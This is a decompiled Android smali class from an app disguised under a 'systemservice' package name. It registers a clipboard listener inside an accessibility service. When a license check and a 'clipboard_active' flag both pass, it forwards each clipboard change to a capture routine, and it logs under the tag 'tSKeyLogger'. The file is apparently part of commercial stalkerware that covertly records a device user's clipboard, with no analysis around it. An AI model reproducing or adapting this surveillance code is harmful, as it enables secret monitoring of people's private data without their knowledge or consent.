.class Lcom/systemservice/common/boostReceiver/f;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/systemservice/common/boostReceiver/UIAccessibilityService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;


# direct methods
.method constructor <init>(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPrimaryClipChanged()V
    .locals 5

    const-string v0, "CLipaa"

    const-string v1, "onPrimaryClipChanged"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v1, 0x0

    const-string v2, "clipboard_active"

    if-nez v0, :cond_1

    :try_start_1
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v2, v1}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    sget-object v0, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->b:Ljava/lang/String;

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-static {v1}, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->a(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-static {v3}, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->b(Lcom/systemservice/common/boostReceiver/UIAccessibilityService;)Lcom/systemservice/a/h/g;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/systemservice/common/boostReceiver/b;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Lcom/systemservice/a/h/g;)V

    goto :goto_1

    :cond_1
    :goto_0
    const-string v0, "tSKeyLogger"

    const-string v3, "return because checkLicenseExpired() = null"

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "StatusFeature"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "G_CLIPBOARD_ACTIVE = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/systemservice/common/boostReceiver/f;->a:Lcom/systemservice/common/boostReceiver/UIAccessibilityService;

    invoke-virtual {v4}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v4, v2, v1}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :goto_1
    return-void
.end method
